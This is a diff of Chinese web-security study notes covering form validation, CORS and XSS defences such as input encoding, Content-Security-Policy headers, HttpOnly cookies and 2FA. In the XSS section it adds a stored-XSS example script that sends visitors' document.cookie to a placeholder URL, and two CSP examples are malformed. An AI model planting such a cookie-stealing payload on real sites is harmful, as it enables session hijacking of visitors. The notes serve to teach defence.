@@ -142,9 +142,23 @@
   * https://ithelp.ithome.com.tw/articles/10236146
 ---
 ### 完善資料驗證程序
-* front-end
+* front-end (html & JS)
+  * `<input>`中
+    * `required`: 必填欄位
+    * `pattern="RegExp"`: RegExp為正規式，規定能輸入的字元格式，例如:<br/>
+      `^[A-Z]\d{9}$`<br/>
+      [A-Z] 代表由 A 至 Z 的所有可能英文字母，\d 代表由 0 至 9 的數目字(也可以寫成 [0-9]），{9} 則代表需要有九個數目字，^ 代表字串開始位置，$ 代表字串結束位置。
+    * `minlength`
+    * `maxlength`
+  * JS利用addEventListener監聽input或submit事件，以及利用inputElement.validity來判斷、添加錯誤訊息
+    * `inputElement.validity.valid`:符合所有<input>的要求。
+    * `inputElement.validity.valueMissing`: if`required` but no value, return true.
+    * `inputElement.validity.patternMismatch`: if value doesn't satisfy the pattern attribute, return true.
 * back-end
 * Reference:
+  * https://pjchender.dev/webapis/webapis-form-validation/
+  * http://www1.nttu.edu.tw/klou/course/921/js/09-regular.htm
+  * https://www.html5pattern.com/
 ---
 ### AJAX 與 CORS
 * CROS ( Cross-Origin Resource Sharing 跨來源資源共享 )
@@ -449,13 +463,47 @@
       ```
     * 然後當 User 瀏覽網頁的時候，就會因為網頁先載入了當下頁面的惡意程式，於是 User 的頁面就會跳出一個 1 的 alert，以此類推， Hacker 在這裡如果輸入讓 User 傳送 cookie 或是其他惡意程式行為，網頁也會完全照做！
 * 實際設計⼀個 XSS 攻擊情境。
+  * 儲存型XSS，例如，在留言板中留下以下內容，利用image，把瀏覽頁面的使用者的cookie，導向自己的server或線上工具，(參考本篇:https://ithelp.ithome.com.tw/articles/10238479)
+  ```html
+  <script>
+  var i=new Image;
+  i.src="<url>/?"+document.cookie;
+  </script>
+  ```
 * 如何預防?
   * 驗證使用者的輸入<br/>
-    
+    * 做好欄位輸入的驗證與檢查，不論是前後端都應假設輸入是惡意且不可信任的，例如：URL、檔案上傳、表單欄位、留言板等。
+    * 文法與語意：應確認每個網頁表單輸入欄位是否為合理的資料類型與內容，例如：年齡的欄位在文法上應只接受0–9的數字，而語意上應確認此數字介於 0–120。
+    * 像上述所說明的任何輸入和其他難以定義文法的自由格式，都應該要經過編碼成為純字符串來處理，防止內容被當作程式碼執行，許多程式框架都有提供內建的編碼函式庫，可以依自己的慣用語言程式查找並多加利用。
+    * 絕對不要將使用者的輸入放入 註解、屬性名稱、標籤名稱 等，因為這些位置都能將字符串作為程式碼運行。
   * CSP<br/>
-    
+    設定內容安全策略（CSP）的標頭，明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括 JavaScriptCSS、HTML框架、字體、圖片和可嵌入對象，例如 Java applet、ActiveX等。<br/>
+    若沒設定到時會自動採用`default-src`的設定值。
+    ```html
+    <!-- 不允許所有內容 -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'none';">
+    <!-- 允許來自相同的網域的所有內容 -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+    <!-- 允許來自相同的網域和某網域(example.com)的所有內容 -->
+    <meta http-equiv="Content-Security-Policy" default-src 'self' example.com *.example.com;">
+    <!-- 允許所有來源的圖片、允許信任來源(example.org, example.net)的媒體(音訊、影片)、允許信任來源(userscripts.example.com)的腳本，其他未設定的允許來自相同的網域的內容 -->
+    <meta http-equiv="Content-Security-Policy" default-src 'self'; img-src *; media-src example.org example.net; script-src userscripts.example.com;">
+    <!-- 範例: online banking site，允許來自信任的網域透過HTTPS傳送的所有內容 -->
+    <meta http-equiv="Content-Security-Policy" content="default-src https://onlinebanking.example.com;">
+    <!-- 範例: web mail site，允許來自相同的網域和某網域的所有內容、允許所有來源的圖片 -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' *.example.com; img-src *;">
+    ```
+  * 保護 Cookie<br/>
+    在Header中 `Set-Cookie`加上 `; HttpOnly`。<br/>
+    對 Cookie 設定 `HttpOnly` 的屬性，代表拒絕與 JavaScript 共享 Cookie ，確保程式碼沒有存取權
+  * 2FA（Two-factor authentication）<br/>
+    比較重要的操作設置第二道關卡，例如需要透過手機接收驗證碼、需要再次輸入密碼等等。
 * Reference:
   * https://hitcon.org/2015/CMT/download/day1-a-r4.pdf
   * https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-scripting/
   * https://ithelp.ithome.com.tw/articles/10185408
   * http://www.powenko.com/wordpress/xss%E6%94%BB%E6%93%8A/
+  * https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+  * https://hackmd.io/@Eotones/BkOX6u5kX
+  * https://blog.huli.tw/2021/06/19/xss-attack-and-defense/
+  * https://ithelp.ithome.com.tw/articles/10238479
